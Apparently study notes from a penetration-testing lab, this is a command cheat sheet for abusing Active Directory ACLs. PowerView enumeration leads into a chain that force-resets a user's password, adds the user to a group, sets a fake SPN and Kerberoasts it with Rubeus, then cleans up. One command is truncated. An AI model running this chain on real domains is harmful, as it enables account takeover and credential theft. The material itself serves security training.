### **Enumerating ACLs with PowerView**
1. Using Find-InterestingDomainAcl: `Find-InterestingDomainAcl`
2. Using Get-DomainObjectACL: `Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}`
3. Performing a Reverse Search & Mapping to a GUID Value:
    1. `$guid= "00299570-246d-11d0-a768-00aa006e0529"`
    2. `Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl`
3. Using the -ResolveGUIDs Flag: `Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $s`
4. Creating a List of Domain Users: `Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt`
5. A Useful foreach Loop: `foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl  "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}`
6. Further Enumeration of Rights Using user-name:
    1. `$sid2 = Convert-NameToSid damundsen`
    2. `Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid2} -Verbose`
7. Investigating the "Help Desk Level 1" Group with Get-DomainGroup: `Get-DomainGroup -Identity "Help Desk Level 1" | select memberof`
8. Investigating the "Information Technology Group":
    1. `$itgroupsid = Convert-NameToSid "Information Technology"`
    2. `Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $itgroupsid} -Verbose`
9. Looking for Interesting Access:
    1. `$adunnsid = Convert-NameToSid adunn` 
    2. `Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $adunnsid} -Verbose`
### **ACL Abuse Tactics**
1. Creating a PSCredential Object:
    1. `$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force`
    2. `$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)`
2. Creating a SecureString Object: `$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force`
3. Changing the User's Password with Set-DomainUserPassword: `Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose`
4. Creating a SecureString Object using user-name: 
    1. `$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force`
    2. `$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)`
5. Adding user  to the Group:
    1. List members: `Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members`
    2. Add user: `Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose`
    3. Confirming: `Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName`
6. Creating a Fake SPN: `Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose`
7. Kerberoasting with Rubeus: `.\Rubeus.exe kerberoast /user:adunn /nowrap`
8. **Cleanup**:
    1. Removing the Fake SPN from adunn's Account: `Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose`
    2. Removing user from the Group: `Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose`
    3. confirm the user was indeed removed: `Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName |? {$_.MemberName -eq 'damundsen'} -Verbose`

